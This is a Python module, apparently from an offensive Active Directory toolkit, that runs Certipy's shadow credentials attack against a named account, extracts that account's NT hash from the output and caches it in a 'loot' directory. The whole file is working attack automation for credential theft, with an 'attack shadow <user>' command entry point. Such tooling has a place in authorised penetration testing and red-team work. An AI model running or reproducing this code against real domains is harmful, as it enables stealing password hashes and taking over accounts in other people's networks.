# modules/shadow.py

import os
from core.helpers import run_command, save_loot
from core.colors import blue, green, red, yellow

def extract_shadow_hash(session, controlled_user):
    """
    Extracts the NT hash of a user using Certipy shadow credentials abuse.
    Saves the hash to loot/<username>.hash if the hash is valid.
    """
    print(blue(f"[*] Running shadow credentials attack for: {controlled_user}"), flush=True)
    loot_path = f"loot/{controlled_user}.hash"

    # Step 1: Try loading from cache
    if os.path.exists(loot_path):
        with open(loot_path, "r") as f:
            cached = f.read().strip()
        if cached and len(cached) >= 32 and all(c in "0123456789abcdefABCDEF:" for c in cached):
            print(green(f"[+] Loaded cached NT hash from {loot_path}"))
            print(green(f"[+] NT hash for {controlled_user}: {cached}"))
            return cached
        else:
            print(yellow(f"[*] Cached hash is invalid or incomplete. Proceeding with live extraction."), flush=True)

    # Step 2: Run Certipy shadow extraction
    shadow_cmd = (
        f"certipy-ad shadow auto -u {session.username}@{session.domain} -p '{session.password}' "
        f"-account {controlled_user}"
    )
    output, err = run_command(shadow_cmd)

    # Step 3: Parse the NT hash from Certipy output
    match = next((line for line in output.splitlines() if "NT hash for" in line and ":" in line), None)
    if not match:
        print(red("[-] Could not extract NT hash from shadow credentials output."), flush=True)
        return None

    nt_hash = match.split(":")[-1].strip()
    if nt_hash and len(nt_hash) == 32 and all(c in "0123456789abcdefABCDEF" for c in nt_hash):
        with open(loot_path, "w") as f:
            f.write(nt_hash + "\n")
        print(green(f"[+] Extracted and saved NT hash to {loot_path}"), flush=True)
        print(green(f"[+] NT hash for {controlled_user}: {nt_hash}"), flush=True)
        return nt_hash
    else:
        print(red("[-] Extracted hash is invalid (None, short, or contains garbage). Not saving to loot."), flush=True)
        return None

def attack_shadow(session, parts):
    if len(parts) < 1:
        print(red("Usage: attack shadow <user>"), flush=True)
        return
    target_user = parts[0]
    extract_shadow_hash(session, target_user)
